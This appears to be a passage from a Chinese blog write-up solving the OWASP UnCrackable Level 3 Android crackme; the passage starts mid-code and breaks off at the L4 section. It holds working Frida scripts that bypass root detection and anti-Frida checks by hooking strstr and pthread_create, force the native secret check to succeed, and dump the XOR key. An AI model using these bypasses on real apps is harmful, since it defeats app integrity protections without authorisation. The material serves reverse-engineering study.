<span class="hljs-string">&quot;/system/etc/.has_su_daemon&quot;</span>, <span class="hljs-string">&quot;/system/etc/.installed_su_daemon&quot;</span>, <span class="hljs-string">&quot;/dev/com.koushikdutta.superuser.daemon/&quot;</span>&#125;) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(str).exists()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>root探测与前两个一样，只是名字稍微变了一下，依然可以采用hook检测函数替换返回值的方法进行绕过。</p><h3 id="Frida脚本-1"><a href="#Frida脚本-1" class="headerlink" title="Frida脚本"></a>Frida脚本</h3><h4 id="绕过root检测"><a href="#绕过root检测" class="headerlink" title="绕过root检测"></a>绕过root检测</h4><p>与之前的一样，修改返回值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;    <br>    <span class="hljs-keyword">var</span> func = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;sg.vantagepoint.util.RootDetection&#x27;</span>);<br>    func.<span class="hljs-property">checkRoot1</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br>func.<span class="hljs-property">checkRoot2</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br>func.<span class="hljs-property">checkRoot3</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="绕过maps中frida关键字的检测"><a href="#绕过maps中frida关键字的检测" class="headerlink" title="绕过maps中frida关键字的检测"></a>绕过maps中frida关键字的检测</h4><p>如果我们直接尝试绕过root检测就会发现frida会报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Process crashed: Trace/BPT <span class="hljs-built_in">trap</span><br><br>***<br>*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***<br>Build fingerprint: <span class="hljs-string">&#x27;samsung/d2que/d2q:9/QP1A.190711.020/900211026:user/release-keys&#x27;</span><br>Revision: <span class="hljs-string">&#x27;0&#x27;</span><br>ABI: <span class="hljs-string">&#x27;x86_64&#x27;</span><br>pid: 4754, tid: 4782, name: tg.uncrackable3  &gt;&gt;&gt; owasp.mstg.uncrackable3 &lt;&lt;&lt;<br><span class="hljs-string">signal 6 (SIGABRT), code -6 (SI_TKILL), fault addr --------</span><br><span class="hljs-string">    rax 0000000000000000  rbx 0000709cb2a17280  rcx 0000709d4c4409f7  rdx 0000000000000006</span><br><span class="hljs-string">    r8  0000000000000031  r9  0000000000000031  r10 0000000000000000  r11 0000000000000202</span><br><span class="hljs-string">    r12 0000709cb2a1bb62  r13 0000709cb2a1bb68  r14 0000709cb2a1bb50  r15 0000709cb2a1bb60</span><br><span class="hljs-string">    rdi 0000000000001292  rsi 00000000000012ae</span><br><span class="hljs-string">    rbp 0000709ccbc14018  rsp 0000709cb2a17268  rip 0000709d4c4409f7</span><br><span class="hljs-string"></span><br><span class="hljs-string">backtrace:</span><br><span class="hljs-string">    #00 pc 00000000000809f7  /system/lib64/libc.so (offset 0x80000) (tgkill+7)</span><br><span class="hljs-string">    #01 pc 000000000000374a  /data/app/owasp.mstg.uncrackable3-t4sbiQd8Jfn7fu2UNT3j1g==/lib/x86_64/libfoo.so (goodbye()+10)</span><br><span class="hljs-string">    #02 pc 000000000000389a  /data/app/owasp.mstg.uncrackable3-t4sbiQd8Jfn7fu2UNT3j1g==/lib/x86_64/libfoo.so</span><br><span class="hljs-string">    #03 pc 0000000000093dcb  /system/lib64/libc.so (offset 0x80000) (__pthread_start(void*)+27)</span><br><span class="hljs-string">    #04 pc 000000000002c0dd  /system/lib64/libc.so (offset 0x2c000) (__start_thread+61)</span><br></code></pre></td></tr></table></figure><p>调用了goodbye直接结束了</p><p>于是重新回到静态代码的分析，frida的检测逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">sub_3080</span><span class="hljs-params">()</span><br>&#123;<br>  FILE *v0; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">528</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-210h] BYREF</span><br><br>  v0 = fopen(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v0 )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      <span class="hljs-keyword">while</span> ( !fgets(s, <span class="hljs-number">512</span>, v0) )<br>      &#123;<br>        fclose(v0);<br>        usleep(<span class="hljs-number">0x1F4</span>u);<br>        v0 = fopen(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-keyword">if</span> ( !v0 )<br>          <span class="hljs-keyword">goto</span> LABEL_7;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( !<span class="hljs-built_in">strstr</span>(s, <span class="hljs-string">&quot;frida&quot;</span>) &amp;&amp; !<span class="hljs-built_in">strstr</span>(s, <span class="hljs-string">&quot;xposed&quot;</span>) );<br>    v1 = <span class="hljs-string">&quot;Tampering detected! Terminating...&quot;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>LABEL_7:<br>    v1 = <span class="hljs-string">&quot;Error opening /proc/self/maps! Terminating...&quot;</span>;<br>  &#125;<br>  __android_log_print(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;UnCrackable3&quot;</span>, v1);<br>  goodbye();<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="绕过frida检测方法1"><a href="#绕过frida检测方法1" class="headerlink" title="绕过frida检测方法1"></a>绕过frida检测方法1</h5><p>我们可以看到直接使用libc的标准库函数strstr检测maps中是否有frida和xposed的关键字，那么我们就可以hook底层的strstr函数，当期望判断是否含有frida时直接返回没有即可，参考<a href="https://codeshare.frida.re/@enovella/anti-frida-bypass/">Frida CodeShare</a>：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var haystack = <span class="hljs-string">&quot;&quot;</span>;<br>var needle = <span class="hljs-string">&quot;&quot;</span>;<br>var frida = <span class="hljs-literal">false</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Interceptor</span>.</span></span>attach(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Module</span>.</span></span>find<span class="hljs-constructor">ExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;strstr&quot;</span>)</span>, &#123;<br>    onEnter: <span class="hljs-keyword">function</span>(args) &#123;<br>        haystack = args<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;<br>        needle = args<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>;<br>        frida = <span class="hljs-constructor">Boolean(0)</span>;<br>        haystack = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>read<span class="hljs-constructor">Utf8String(<span class="hljs-params">haystack</span>)</span>;<br>        needle = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Memory</span>.</span></span>read<span class="hljs-constructor">Utf8String(<span class="hljs-params">needle</span>)</span>;<br>        <span class="hljs-keyword">if</span> (haystack.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;frida&quot;</span>)</span> !== -<span class="hljs-number">1</span><span class="hljs-operator"> || </span>haystack.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;xposed&quot;</span>)</span> !== -<span class="hljs-number">1</span>) &#123;<br>            frida = <span class="hljs-constructor">Boolean(1)</span>;<br>        &#125;<br>    &#125;,<br>    onLeave: <span class="hljs-keyword">function</span>(retval) &#123;<br>        <span class="hljs-keyword">if</span> (frida) &#123;<br>            retval.replace(<span class="hljs-number">0</span>);<br>        &#125;<br>        return retval;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h5 id="绕过frida检测方法2"><a href="#绕过frida检测方法2" class="headerlink" title="绕过frida检测方法2"></a>绕过frida检测方法2</h5><p>参考<a href="https://enovella.github.io/android/reverse/2017/05/20/android-owasp-crackmes-level-3.html">Android OWASP crackmes: Write-up UnCrackable Level 3 - Computer Issues (enovella.github.io)</a>的方法，绕过frida检测还可以不创建检测线程（太妙了）。由于检测frida的线程和反调试线程是通过pthread创建的，并且调用过程中特征为参数1和参数3都是0（<code>pthread_create(&amp;v2, 0, (void *(*)(void *))sub_3220, 0);</code>，<code>pthread_create((pthread_t *)newthread, 0, (void *(*)(void *))sub_3080, 0);</code>），我们可以hook线程创建函数，检测到第一个参数和第三个参数为0时调用一个始终返回0的线程：</p><ul><li>从libc函数pthread_create中获取本地指针。</li><li>用这个指针创建一个本地函数。</li><li>定义一个本地回调并重载此方法。</li><li>使用带有replace模式的Interceptor注入替换。</li><li>如果我们检测到pthread_create想要产生检测frida或者调试的线程，那么我们将执行回调，并且总是返回0，模拟Frida不在进程的地址空间中。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript">   <span class="hljs-comment">// int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);</span><br><span class="hljs-keyword">var</span> p_pthread_create = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;pthread_create&quot;</span>);<br><span class="hljs-keyword">var</span> pthread_create = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>( p_pthread_create, <span class="hljs-string">&quot;int&quot;</span>, [<span class="hljs-string">&quot;pointer&quot;</span>, <span class="hljs-string">&quot;pointer&quot;</span>, <span class="hljs-string">&quot;pointer&quot;</span>, <span class="hljs-string">&quot;pointer&quot;</span>]);<br><span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;NativeFunction pthread_create() replaced @ &quot;</span> + pthread_create);<br><br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">replace</span>( p_pthread_create, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeCallback</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">ptr0, ptr1, ptr2, ptr3</span>) &#123;<br><span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;pthread_create() overloaded&quot;</span>);<br><span class="hljs-keyword">var</span> ret = <span class="hljs-title function_">ptr</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (ptr1.<span class="hljs-title function_">isNull</span>() &amp;&amp; ptr3.<span class="hljs-title function_">isNull</span>()) &#123;<br><span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;loading fake pthread_create because ptr1 and ptr3 are equal to 0!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;loading real pthread_create()&quot;</span>);<br>ret = <span class="hljs-title function_">pthread_create</span>(ptr0,ptr1,ptr2,ptr3);<br>&#125;<br><br><span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ret: &quot;</span> + ret);<br><br>&#125;, <span class="hljs-string">&quot;int&quot;</span>, [<span class="hljs-string">&quot;pointer&quot;</span>, <span class="hljs-string">&quot;pointer&quot;</span>, <span class="hljs-string">&quot;pointer&quot;</span>, <span class="hljs-string">&quot;pointer&quot;</span>]));<br></code></pre></td></tr></table></figure><p>运行frida绕过和root检测绕过脚本就可以进入输入secret页面：</p><p><img src="/images/image-20231214160641224.png"></p><p>输入静态分析的key：</p><p><img src="/images/image-20231214155830206.png"></p><h4 id="绕过secret检测逻辑"><a href="#绕过secret检测逻辑" class="headerlink" title="绕过secret检测逻辑"></a>绕过secret检测逻辑</h4><p>跟L2中的逻辑类似，只是要多一个frida检测的绕过</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Java.perform(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;    <br>    <span class="hljs-keyword">var</span> func = Java.use(<span class="hljs-string">&#x27;sg.vantagepoint.util.RootDetection&#x27;</span>);<br>    func.checkRoot1.implementation = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br>func.checkRoot2.implementation = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br>func.checkRoot3.implementation = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br>setTimeout(<span class="hljs-keyword">function</span> <span class="hljs-title function_">x</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> func_addr = Module.findExportByName(<span class="hljs-string">&quot;libfoo.so&quot;</span>,<span class="hljs-string">&quot;Java_sg_vantagepoint_uncrackable3_CodeCheck_bar&quot;</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(func_addr);<br>Interceptor.attach(func_addr, &#123;<br><span class="hljs-comment">//onEnter: function(args)顾名思义就是进入该函数前要执行的代码，其中args是传入的参数，一般so层函数第一个参数都是JniEnv，第二个参数是jclass，从第三个参数开始才是我们java层传入的参数</span><br>onEnter: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Hook start&quot;</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;args[2]=&quot;</span> + args[<span class="hljs-number">2</span>]); <span class="hljs-comment">//打印我们java层第一个传入的参数，这里是字节数组指针地址byte[] bArr</span><br>&#125;,<br><span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123; <span class="hljs-comment">//onLeave: function(retval)是该函数执行结束要执行的代码，其中retval参数即是返回值</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;return original value:&quot;</span>+retval); <span class="hljs-comment">//打印原始返回值</span><br>retval.<span class="hljs-built_in">replace</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;);<br>&#125;, <span class="hljs-number">1000</span>);<br>&#125;);<br><span class="hljs-keyword">var</span> haystack = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">var</span> needle = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">var</span> frida = <span class="hljs-literal">false</span>;<br>Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;strstr&quot;</span>), &#123;<br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>        haystack = args[<span class="hljs-number">0</span>];<br>        needle = args[<span class="hljs-number">1</span>];<br>        frida = <span class="hljs-built_in">Boolean</span>(<span class="hljs-number">0</span>);<br>        haystack = Memory.readUtf8String(haystack);<br>        needle = Memory.readUtf8String(needle);<br>        <span class="hljs-keyword">if</span> (haystack.<span class="hljs-built_in">indexOf</span>(<span class="hljs-string">&quot;frida&quot;</span>) !== <span class="hljs-number">-1</span> || haystack.<span class="hljs-built_in">indexOf</span>(<span class="hljs-string">&quot;xposed&quot;</span>) !== <span class="hljs-number">-1</span>) &#123;<br>            frida = <span class="hljs-built_in">Boolean</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br>        <span class="hljs-keyword">if</span> (frida) &#123;<br>            retval.<span class="hljs-built_in">replace</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> retval;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/images/image-20231214161006657.png"></p><h4 id="动态获取异或的key（静态分析中的v9的值）"><a href="#动态获取异或的key（静态分析中的v9的值）" class="headerlink" title="动态获取异或的key（静态分析中的v9的值）"></a>动态获取异或的key（静态分析中的v9的值）</h4><p>勾取sub_FA0的入参v9，打印出v9的值，上述分析的都是32位程序，因此sub_FA0的偏移地址是0xFA0，下面的代码是在64位系统中运行的，因此偏移量设置为64位lib的值0x12C0，可以根据实际情况调整add的偏移量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> func = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;sg.vantagepoint.util.RootDetection&#x27;</span>);<br>  func.<span class="hljs-property">checkRoot1</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;;<br>  func.<span class="hljs-property">checkRoot2</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;;<br>  func.<span class="hljs-property">checkRoot3</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;;<br><br>  <span class="hljs-keyword">const</span> <span class="hljs-title class_">System</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.lang.System&quot;</span>);<br>  <span class="hljs-keyword">const</span> <span class="hljs-title class_">Runtime</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>  <span class="hljs-keyword">const</span> <span class="hljs-title class_">SystemLoad</span>_2 = <span class="hljs-title class_">System</span>.<span class="hljs-property">loadLibrary</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br>  <span class="hljs-keyword">const</span> <span class="hljs-title class_">VMStack</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;dalvik.system.VMStack&quot;</span>);<br>  <br>  <span class="hljs-title class_">SystemLoad</span>_2.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">library</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Loading dynamic library =&gt; &quot;</span> + library);<br>  <span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">const</span> loaded = <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">loadLibrary0</span>( <span class="hljs-title class_">VMStack</span>.<span class="hljs-title function_">getCallingClassLoader</span>(), library);<br><span class="hljs-keyword">if</span>(library.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;foo&quot;</span>)) &#123;<br>  <span class="hljs-comment">//function that gets the xored value </span><br>  <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;libfoo.so&quot;</span>).<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;0x000012c0&#x27;</span>),&#123; <span class="hljs-comment">//ida分析的是32位的程序，32位应该是add(&#x27;0x00000fa0&#x27;)，由于本次虚拟机是64位，因此相关的函数地址为0x12c0</span><br><span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;getting other_key value&quot;</span>);<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">other_key_address</span> = args[<span class="hljs-number">0</span>];<br>&#125;,<br><span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123;<br>  <span class="hljs-keyword">var</span> other_key = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">other_key_address</span>);<br>  <span class="hljs-keyword">var</span> arr = other_key.<span class="hljs-title function_">readByteArray</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr);<br>&#125;<br>  &#125;);<br>&#125;<br><span class="hljs-keyword">return</span> loaded;<br>  &#125; <span class="hljs-keyword">catch</span>(ex) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ex);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ex.<span class="hljs-property">stack</span>);<br>  &#125;<br>  &#125;;<br>&#125;);<br><span class="hljs-keyword">var</span> haystack = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">var</span> needle = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">var</span> frida = <span class="hljs-literal">false</span>;<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;strstr&quot;</span>), &#123;<br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>        haystack = args[<span class="hljs-number">0</span>];<br>        needle = args[<span class="hljs-number">1</span>];<br>        frida = <span class="hljs-title class_">Boolean</span>(<span class="hljs-number">0</span>);<br>        haystack = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(haystack);<br>        needle = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(needle);<br>        <span class="hljs-keyword">if</span> (haystack.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;frida&quot;</span>) !== -<span class="hljs-number">1</span> || haystack.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;xposed&quot;</span>) !== -<span class="hljs-number">1</span>) &#123;<br>            frida = <span class="hljs-title class_">Boolean</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br>        <span class="hljs-keyword">if</span> (frida) &#123;<br>            retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> retval;<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>结果与我们静态分析的结果一致：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[SM-N976N::owasp.mstg.uncrackable3 ]-&gt; Loading dynamic library =&gt; foo<br>getting other_key value<br>           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF<br>00000000  1d 08 11 13 0f 17 49 15 0d 00 03 19 5a 1d 13 15  ......I.....Z...<br>00000010  08 0e 5a 00 17 08 13 14                          ..Z.....<br></code></pre></td></tr></table></figure><h2 id="L4"><a href="#L4" class="headerlink" title="L4"></a>L4</h2><p>暂时没分析出来，等后续水平提升了继续。分析了一下加载过程中的一些调用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 